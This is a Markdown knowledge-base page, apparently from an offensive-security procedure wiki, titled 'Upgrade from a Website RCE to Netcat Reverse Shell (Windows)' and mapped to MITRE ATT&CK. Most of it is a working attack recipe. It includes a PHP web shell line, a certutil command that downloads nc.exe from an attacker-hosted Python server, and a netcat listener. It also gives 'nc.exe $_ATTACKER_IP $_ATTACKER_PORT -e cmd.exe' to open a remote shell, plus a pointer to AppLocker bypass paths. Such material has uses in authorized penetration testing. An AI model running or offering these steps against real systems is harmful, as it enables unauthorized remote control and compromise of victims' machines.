---
id: aca84411-6029-42ec-bf05-2c58c836bebb
name: Upgrade from a Website RCE to Netcat Reverse Shell (Windows)
type: procedure
verified: true
submitted: true
created_at: '2019-12-05T22:28:02.952450+00:00'
updated_at: '2023-05-26T15:57:13.157645+00:00'
tactics:
- '[[Execution|TA0002 - Execution]]'
techniques:
- '[[Command-Line Interface|T1059 - Command-Line Interface]]'
platforms:
- Windows
tags:
- '[[Network]]'
- '[[shell]]'
commands:
- '[[certutil.exe -urlcache -split -f "http://$_REMOTE_]]'
- '[[Create a Netcat Listener]]'
- '[[Download from a Remote HTTP Server (certutil)]]'
- '[[Execute Netcat from a Command Shell (cmd.exe) RCE]]'
- '[[Launch a Python 3 Web Server]]'
---

# Upgrade from a Website RCE to Netcat Reverse Shell (Windows)

**Status**: ✓ Verified

## Summary

Download and execute Netcat to create  a reverse shell on a remote system. While Windows  can spawn reverse shells natively, the key functions are often blocked for security reasons, so a third party program like Netcat is required. 

## Description

# Description

Download and execute Netcat to create  a reverse shell on a remote system. While Windows  can spawn reverse shells natively, the key functions are often blocked for security reasons, so a third party program like Netcat is required.

# Instructions

This procedure will assume remote code execution is being done with a PHP cmdshell, but the concepts are generic and can apply to many situations. In this case, the following PHP code has been added to a web page.

**Code**: [[<?php system($_REQUEST["cmd"]); ?>]]

1. Download and extract nc.exe (or nc64.exe): [Download the NetCat for Windows static binaries](https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip).

2. Host nc.exe on a web server on the attacker's machine.

**Command** ([[Launch a Python 3 Web Server]]):

```bash
python3 -m http.server $_PORT
```

3. Download nc.exe to the target using the website RCE.

**Command** ([[certutil.exe -urlcache -split -f "http://$_REMOTE_]]):

```bash
certutil.exe -urlcache -split -f "http://$_REMOTE_IP/$_FILENAME" $_FILENAME
```

Tip: Use the [Placing files in writable paths](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md) section of the Ultimate AppLocker Bypass List to find a writable directory not restricted by security controls (eg. C:\Windows\Tasks).

4. Set up a netcat listener on the Attacker machine, then execute Netcat using the RCE.

**Command** ([[Create a Netcat Listener]]):

```bash
nc -lvnp $_PORT
```

5. Execute the shell.

**Command** ([[Execute Netcat from a Command Shell (cmd.exe) RCE]]):

```bash
cmd.exe /C "nc.exe $_ATTACKER_IP $_ATTACKER_PORT -e cmd.exe"
```

## Platforms

- Windows

## MITRE ATT&CK Mapping

### Tactics

- [[Execution|TA0002 - Execution]]

### Techniques

- [[Command-Line Interface|T1059 - Command-Line Interface]]

## Commands Used

- [[certutil.exe -urlcache -split -f "http://$_REMOTE_]]
- [[Create a Netcat Listener]]
- [[Download from a Remote HTTP Server (certutil)]]
- [[Execute Netcat from a Command Shell (cmd.exe) RCE]]
- [[Launch a Python 3 Web Server]]

## Tags

- [[Network]]
- [[shell]]
